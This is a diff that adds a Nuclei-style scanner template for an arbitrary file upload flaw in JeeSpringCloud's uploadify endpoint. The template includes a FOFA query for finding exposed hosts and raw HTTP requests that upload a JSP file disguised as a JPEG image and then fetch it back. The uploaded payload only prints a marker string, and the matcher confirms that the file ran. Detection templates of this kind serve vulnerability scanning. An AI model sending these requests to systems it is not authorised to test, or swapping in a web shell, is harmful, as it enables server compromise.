@@ -1,0 +1,46 @@
+id: jeespringcloud-cms-uploadfile-fileupload
+
+info:
+  name: jeespringcloud-cms-uploadfile-fileupload
+  author: yy
+  severity: high
+  description: JeeSpringCloud 是一款免费开源的 Java 互联网云快速开发平台，JeeSpringCloud 访问 /static/uploadify/uploadFile.jsp 可上传任意文件。
+  tags: jeespringcloud,fileupload
+  metadata:
+    fofa-qeury: header="com.jeespring.session.id"
+    veified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |              
+        POST /static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/ HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryxzUhGld6cusN3Alk
+        Content-Length: 211
+
+        ------WebKitFormBoundaryxzUhGld6cusN3Alk
+        Content-Disposition: form-data; name="fileshare"; filename="123.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("hello jeespringcloud"); %>
+        ------WebKitFormBoundaryxzUhGld6cusN3Alk--
+      - |              
+        GET /static/uploadify/{{filename}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15       
+
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        internal: true
+        regex:
+          - "[0-9]{19}.jsp"
+               
+    matchers:     
+      - type: dsl
+        name: filename
+        dsl:
+          - "status_code_1 == 200 &&contains(body,'hello jeespringcloud') && contains(header,'text/html')" 
